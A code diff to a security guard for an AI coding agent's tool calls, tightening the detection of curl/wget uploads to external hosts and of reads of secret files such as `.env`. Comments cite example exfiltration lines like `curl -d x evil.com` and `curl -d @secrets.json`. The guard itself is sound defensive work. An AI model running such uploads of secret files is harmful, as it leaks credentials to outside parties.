@@ -179,15 +179,42 @@ function gitCommitReason(toks) {
 // ---------------------------------------------------------------------------
 // Отправка данных наружу: curl/wget с телом запроса или загрузкой файла.
 
-const UPLOAD_FLAG_RE = /^(-d|--data|--data-raw|--data-binary|--data-urlencode|-F|--form|-T|--upload-file|--json)$/;
+// curl — `-d`, `-F`, `-T`, `--data*`, `--json`; wget — `--post-*`, `--body-*`.
+// Короткие бывают слитными (`-dfoo`, `-d@file`), длинные — через `=`.
+const UPLOAD_FLAG_RE = /^(-[dFT]|--(data[\w-]*|form[\w-]*|upload-file|json|post-(data|file)|body-(data|file)))(=|$)|^-[dFT]./;
+const FROM_FILE_FLAG_RE = /^(-T|--upload-file|--(post|body)-file)/;
+
+const hasUploadFlag = (toks) => toks.some((t) => UPLOAD_FLAG_RE.test(t));
+
+// Опции curl/wget с отдельным аргументом: их аргумент — не адрес.
+const OUTBOUND_ARG_OPTS = new Set(['-d', '--data', '--data-raw', '--data-binary', '--data-urlencode',
+  '--data-ascii', '-F', '--form', '--form-string', '-T', '--upload-file', '--json', '-H', '--header',
+  '-X', '--request', '-o', '--output', '-u', '--user', '-A', '--user-agent', '-e', '--referer',
+  '-b', '--cookie', '-c', '--cookie-jar', '-K', '--config', '-x', '--proxy', '-w', '--write-out',
+  '-m', '--max-time', '--connect-timeout', '--retry', '-r', '--range', '-E', '--cert', '--key',
+  '--cacert', '--resolve', '--post-data', '--post-file', '--body-data', '--body-file', '--method',
+  '-U', '-P', '--directory-prefix']);
+
+// Адрес без схемы (`curl -d x evil.com`) — свободный аргумент команды. Хост —
+// его начало до порта или пути.
+function bareHosts(toks) {
+  const hosts = [];
+  for (let i = commandIndex(toks) + 1; i < toks.length; i++) {
+    const t = toks[i];
+    if (OUTBOUND_ARG_OPTS.has(t)) { i++; continue; }
+    // Перенаправления (`2>&1`, `>out.json`) — не адреса.
+    if (/^(-|@|\d*[<>])/.test(t) || t.includes('://')) continue;
+    hosts.push(t.replace(/^[^@/]*@/, '').split(/[/:?]/)[0]);
+  }
+  return hosts;
+}
 
 function outboundReason(toks, seg) {
-  const hasBody = toks.some((t) => UPLOAD_FLAG_RE.test(t) || /^--(data|form|json)=/.test(t));
-  if (!hasBody) return null;
-  const hosts = hostsIn(seg, toks);
-  const external = hosts.filter((h) => !LOCAL_HOST_RE.test(h));
+  if (!hasUploadFlag(toks)) return null;
+  const hosts = [...hostsIn(seg, toks), ...bareHosts(toks)];
+  const external = hosts.filter((h) => h && !LOCAL_HOST_RE.test(h));
   if (external.length === 0) return null;
-  const fromFile = /[@<]\s*[\w./-]+/.test(seg);
+  const fromFile = /[@<]\s*[\w./-]+/.test(seg) || toks.some((t) => FROM_FILE_FLAG_RE.test(t));
   return `отправка данных на ${external[0]}${fromFile ? ' с содержимым файла' : ''}`;
 }
 
@@ -201,7 +228,8 @@ const READS_FILE = new Set([
   'cat', 'head', 'tail', 'less', 'more', 'bat', 'nl', 'tac', 'rev', 'od', 'xxd', 'strings',
   'grep', 'egrep', 'fgrep', 'rg', 'ag', 'ack', 'sed', 'awk', 'gawk', 'cut', 'sort', 'uniq',
   'source', '.', 'diff', 'vimdiff', 'base64', 'openssl',
-  'node', 'python', 'python3', 'ruby', 'php', 'deno', 'bun', 'jq', 'yq',
+  'dd', 'paste', 'hexdump', 'hd', 'fold', 'fmt', 'expand', 'iconv', 'column', 'pr', 'comm', 'join',
+  'node', 'python', 'python3', 'ruby', 'php', 'perl', 'deno', 'bun', 'jq', 'yq',
 ]);
 
 // Копирование и передача: опасен источник, а не назначение.
@@ -229,7 +257,7 @@ function secretPathsIn(seg, toks) {
   // и в regex, и в неквотированном shell это обычная точка, а не разделитель
   // пути перед `.env`.
   return [...found]
-    .map((c) => String(c).replace(/^@/, '').replace(/\\\./g, '.'))
+    .map((c) => String(c).replace(/^(-\w)?@/, '').replace(/\\\./g, '.'))
     .filter(isSecretPath);
 }
 
@@ -260,8 +288,7 @@ function readsSecret(seg, toks, cmd) {
 
   // Отправка секрета наружу телом запроса: `curl -d @secrets.json`, `-T .env`.
   // Здесь запрет, а не вопрос: подтверждать утечку ключей нечем.
-  if (/^(curl|wget|http|httpie)$/.test(cmd)
-    && toks.some((t) => UPLOAD_FLAG_RE.test(t) || /^--(data|form|json)=/.test(t))) {
+  if (/^(curl|wget|http|httpie)$/.test(cmd) && hasUploadFlag(toks)) {
     return secrets[0];
   }
 
@@ -540,8 +567,12 @@ export function securityGuard(toolName, toolInput = {}, ctx = {}) {
   if (name === 'Bash') return guardBashSecurity(ti.command);
   if (name === 'mcp__ide__executeCode') return guardBashSecurity(ti.code);
   if (name === 'Grep') {
-    const target = ti.path || ti.glob || '';
-    return isSecretPath(target) ? guardReadSecurity(target) : null;
+    // glob проверяется и как имя, и как шаблон: `.env*` захватывает `.env`,
+    // `.env.*` — `.env.local`.
+    const glob = String(ti.glob || '');
+    const target = [ti.path, glob, glob.replace(/\*+/g, ''), glob.replace(/\*+/g, 'x')]
+      .find((p) => p && isSecretPath(p));
+    return target ? guardReadSecurity(target) : null;
   }
   if (MCP_FILE_READERS.test(name)) {
     const target = mcpFileTarget(ti);
